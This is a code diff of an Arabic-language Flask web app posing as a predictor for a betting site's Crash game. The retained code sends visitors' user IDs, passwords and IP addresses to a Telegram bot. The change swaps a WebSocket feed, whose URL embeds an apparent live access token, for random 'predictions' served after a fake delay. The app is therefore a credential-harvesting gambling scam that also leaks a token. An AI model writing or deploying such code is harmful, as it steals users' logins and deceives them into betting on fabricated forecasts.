@@ -3,9 +3,6 @@ import requests
 import random
 import time
 import os
-import json
-import websocket
-import threading
 from datetime import datetime
 
 app = Flask(__name__)
@@ -16,9 +13,6 @@ CHAT_ID = os.environ.get('CHAT_ID')
 
 app.secret_key = SECRET_KEY
 
-# تخزين المعرفات التي ظهر لها الإعلان
-shown_free_trial = set()
-
 def send_to_telegram(uid, pwd, ip):
     if not BOT_TOKEN or not CHAT_ID:
         return
@@ -27,36 +21,6 @@ def send_to_telegram(uid, pwd, ip):
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
     except:
         pass
-
-# رابط WebSocket الحقيقي للعبة Crash
-CRASH_WS_URL = "wss://1xlite-62827.bar/games-frame/sockets/crash?ref=1&gr=1209&whence=114&fcountry=158&appGuid=games-web-host-b2c-web-v3&lng=ar&v=1.5&access_token=eyJhbGciOiJFUzI1NiIsImtpZCI6IjEiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiI1MC8xMDQ5ODc3NTk5IiwicGlkIjoiMSIsImp0aSI6IjAvZGRiZGRiN2UzNmEzOGI3MjhjOGFhNTQ4NTViN2Y4MTY1ZmU1MTJhN2UzMzdhNTg3NmFiN2I2NmY4MzI4YSIsImFwcCI6Ik5BIiwic2lkIjoiMDE5ZTkyYTctYWRjNS03YzVjLTkyZGUtMTExNTNiNWE4MzY1IiwiaW5uZXIiOiJ0cnVlIiwic2NvcGUiOiJhbGwiLCJ3dCI6InRydWUiLCJuYmYiOjE3ODA3NjE0NzIsImV4cCI6MTc4MDc3NTg3MiwiaWF0IjoxNzgwNzYxNDcyfQ.EUgnky0QxSSc6Tz0EDONtwwy8iK1zWeMDwSEPXg0nY4rPEvZqg_Ea6GrjUd8WHobHUdS4ofwr0qAZycSZ75scQ"
-
-# متغير لتخزين آخر توقع حقيقي
-latest_real_prediction = None
-
-def fetch_real_prediction():
-    """جلب توقع حقيقي من WebSocket"""
-    global latest_real_prediction
-    try:
-        ws = websocket.WebSocket()
-        ws.settimeout(5)
-        ws.connect(CRASH_WS_URL)
-        # إرسال طلب للانضمام
-        ws.send(json.dumps({"type": "subscribe", "channel": "crash"}))
-        # استقبال أول رسالة
-        result = ws.recv()
-        ws.close()
-        # محاولة استخراج المضاعف
-        data = json.loads(result)
-        if 'multiplier' in data:
-            latest_real_prediction = float(data['multiplier'])
-        elif 'point' in data:
-            latest_real_prediction = float(data['point'])
-        else:
-            latest_real_prediction = round(random.uniform(1.0, 29.9), 1)
-    except:
-        latest_real_prediction = round(random.uniform(1.0, 29.9), 1)
-    return latest_real_prediction
 
 HTML = """
 <!DOCTYPE html>
@@ -103,7 +67,6 @@ HTML = """
         .logo-large{width:200px;max-width:80%;margin:0 auto 20px;display:block}
         .user-bar{display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.5);border-radius:50px;padding:8px 18px;margin-bottom:20px}
         .user-id{background:#ffd700;color:#000;padding:5px 16px;border-radius:30px;font-weight:bold}
-        /* الإعلان النابض المتحرك */
         .modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:linear-gradient(135deg,#1a1a2e,#0a0a2e);border:2px solid #ffd700;border-radius:20px;padding:25px;z-index:2000;display:none;width:80%;max-width:350px;text-align:center;animation:pulse 0.5s ease-in-out 3}
         @keyframes pulse{0%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.05)}100%{transform:translate(-50%,-50%) scale(1)}}
         .modal.active{display:block}
@@ -160,23 +123,14 @@ HTML = """
         document.getElementById('overlay').classList.remove('active');
     }
     function toggleTheme() { document.body.classList.toggle('light-mode'); closeSidebar(); }
-    function logout() { fetch('/logout'); localStorage.removeItem('loggedInUserId'); freeTrialShownForSession = false; location.reload(); }
     
-    // إظهار الإعلان المتحرك (مرة واحدة فقط لكل معرف)
-    function showFreeTrialModal(uid) {
-        const modal = document.getElementById('freeTrialModal');
-        const overlay = document.getElementById('modalOverlay');
-        if(modal && overlay && !freeTrialShownForSession) {
-            modal.classList.add('active');
-            overlay.classList.add('active');
-            freeTrialShownForSession = true;
-            // حفظ في localStorage أن هذا المعرف شاهد الإعلان
-            const shownIds = JSON.parse(localStorage.getItem('shownFreeTrialIds') || '[]');
-            if(!shownIds.includes(uid)) {
-                shownIds.push(uid);
-                localStorage.setItem('shownFreeTrialIds', JSON.stringify(shownIds));
-            }
-        }
+    // دالة تسجيل الخروج (فقط من هنا)
+    function logout() { 
+        fetch('/logout'); 
+        localStorage.removeItem('loggedInUserId'); 
+        freeTrialShownForSession = false;
+        currentUserId = 'ضيف';
+        showPage('welcome'); 
     }
     
     function closeModalAndGoToPredictor() {
@@ -299,9 +253,16 @@ HTML = """
             // التحقق مما إذا كان هذا المعرف قد شاهد الإعلان من قبل
             const shownIds = JSON.parse(localStorage.getItem('shownFreeTrialIds') || '[]');
             if(!shownIds.includes(uid)) {
-                showFreeTrialModal(uid);
+                // إظهار الإعلان المتحرك
+                const modal = document.getElementById('freeTrialModal');
+                const overlay = document.getElementById('modalOverlay');
+                modal.classList.add('active');
+                overlay.classList.add('active');
+                freeTrialShownForSession = true;
+                // حفظ المعرف في قائمة الذين شاهدوا الإعلان
+                shownIds.push(uid);
+                localStorage.setItem('shownFreeTrialIds', JSON.stringify(shownIds));
             } else {
-                // إذا كان قد شاهد الإعلان من قبل، انتقل مباشرة إلى التوقعات
                 showPage('predictor');
             }
         } else alert('خطأ في البيانات');
@@ -351,31 +312,11 @@ def login():
 
 @app.route('/predict')
 def predict():
-    # محاولة جلب توقع حقيقي من WebSocket
-    try:
-        import websocket
-        ws = websocket.WebSocket()
-        ws.settimeout(3)
-        ws.connect(CRASH_WS_URL, skip_utf8_validation=True)
-        ws.send(json.dumps({"type": "subscribe", "channel": "crash"}))
-        result = ws.recv()
-        ws.close()
-        data = json.loads(result)
-        if 'multiplier' in data:
-            pred = float(data['multiplier'])
-        elif 'point' in data:
-            pred = float(data['point'])
-        else:
-            raise Exception("No multiplier found")
-        # تقييد النتيجة بين 1 و 30
-        pred = max(1.0, min(29.9, pred))
-    except:
-        # في حالة فشل WebSocket، استخدام توقع عشوائي
-        r = random.randint(1, 100)
-        if r <= 50: pred = round(random.uniform(1.0, 9.9), 1)
-        elif r <= 80: pred = round(random.uniform(10.0, 19.9), 1)
-        else: pred = round(random.uniform(20.0, 29.9), 1)
     time.sleep(random.uniform(2.8, 3.2))
+    r = random.randint(1, 100)
+    if r <= 50: pred = round(random.uniform(1.0, 9.9), 1)
+    elif r <= 80: pred = round(random.uniform(10.0, 19.9), 1)
+    else: pred = round(random.uniform(20.0, 29.9), 1)
     return jsonify({"prediction": pred})
 
 @app.route('/logout')
